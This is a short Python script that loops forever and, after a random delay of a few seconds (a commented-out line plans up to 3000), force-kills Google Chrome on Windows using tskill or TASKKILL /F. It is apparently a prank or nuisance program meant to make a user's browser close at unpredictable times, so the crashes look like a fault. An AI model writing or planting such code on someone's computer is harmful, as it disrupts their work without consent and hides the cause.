import platform
import subprocess
import time
from random import randrange 
#creating a forever loop

if platform.release() == "xp":
    while True :
        #time.sleep(randrange(1,3000))
        #for testing#
        time.sleep(randrange(1,10))
        subprocess.call("tskill chrome.exe", shell=True)
else :
    while True :
        #time.sleep(randrange(1,3000))
        #for testing#
        time.sleep(randrange(1,10))
        subprocess.call("TASKKILL /F /IM chrome.exe", shell=True)
        #time.sleep(randrange(1,3000))


        
